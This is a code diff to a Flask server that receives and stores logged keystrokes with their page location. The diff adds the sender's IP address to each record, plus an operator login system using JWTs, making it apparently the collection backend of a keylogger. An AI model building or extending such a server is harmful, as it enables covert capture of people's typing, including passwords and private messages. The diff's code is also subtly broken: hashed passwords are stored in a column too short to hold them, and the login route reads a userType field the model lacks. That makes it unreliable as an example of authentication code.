@@ -3,6 +3,10 @@ from datetime import date, datetime
 from flask_sqlalchemy import SQLAlchemy
 from flask_migrate import Migrate
 from flask_cors import CORS
+from sqlalchemy import true
+from werkzeug.security import generate_password_hash, check_password_hash
+from flask_jwt_extended import create_access_token, get_jwt, get_jwt_identity, unset_jwt_cookies, jwt_required, JWTManager
+from datetime import datetime, timedelta, timezone,date
 
 app = Flask(__name__, static_folder="../build", static_url_path='/')
 CORS(app, supports_credentials=True)
@@ -26,7 +30,13 @@ class Key_strokes(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     key = db.Column(db.String(15), nullable = False)
     location = db.Column(db.String(30), nullable = False)
+    ip_address = db.Column(db.String(30), nullable = True)
     timestamp = db.Column(db.DateTime, default = datetime.utcnow)
+
+class Login(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    username = db.Column(db.String(50), nullable = False)
+    password = db.Column(db.String(50), nullable = False)
 
 @app.route('/')
 def index():
@@ -81,8 +91,11 @@ def new_keylog():
     request_data=json.loads(request.data)
     key = request_data['key']
     location = request_data['location']
+    ip_address = request_data['ip_address']
 
-    new_blog = Key_strokes(key = key, location = location)
+    print(ip_address)
+
+    new_blog = Key_strokes(key = key, location = location, ip_address = ip_address)
     db.session.add(new_blog)
     db.session.commit()
     return {'msg': 'success added successfully'}
@@ -98,8 +111,60 @@ def keylogs_serializer(blog):
         'id': blog.id,
         'key': blog.key,
         'location': blog.location,
+        'ip_address': blog.ip_address,
         'timestamp': blog.timestamp
     }
+
+@app.route('/api/add_user',  methods=['POST'])
+def register_user():
+    
+    request_data=json.loads(request.data)
+    username = request_data['username']
+    password = request_data['password']
+
+    check_user = Login.query.filter_by(username=username).first()
+    if check_user:
+        return {'msg':'username already exists. Try a different one'}
+
+    new_user = Login(username=username, password=generate_password_hash(password, method='sha256'))
+    db.session.add(new_user)
+    db.session.commit()
+
+    return {"msg":"A new account has been created successfully"}
+
+@app.route('/api/login', methods=['POST'])
+def login_post():
+    request_data=json.loads(request.data)
+    username = request_data['username']
+    password = request_data['password']
+
+    user = Login.query.filter_by(username=username).first()
+
+    #  take the user-supplied password
+    if not user or not check_password_hash(user.password, password):
+        message='Please check your login details and try again.'
+        return jsonify(message),403 # if the user doesn't exist or password is wrong, reload the page
+    access_token = create_access_token(identity=username)
+    response = {"access_token":access_token, "user_type": user.userType, "username":user.username}
+    
+    return jsonify(response)
+
+@app.after_request
+def refresh_expiring_jwts(response):
+    try:
+        exp_timestamp = get_jwt()["exp"]
+        now = datetime.now(timezone.utc)
+        target_timestamp = datetime.timestamp(now + timedelta(minutes=100))
+        if target_timestamp > exp_timestamp:
+            access_token = create_access_token(identity=get_jwt_identity())
+            data = response.get_json()
+            if type(data) is dict:
+                data["access_token"] = access_token
+                response.data = json.dumps(data)
+        return response
+    except (RuntimeError, KeyError):
+        #case where there is no valid JW. Just return the original responce
+        return response
 
 if __name__ == "__main__":
     db.create_all()
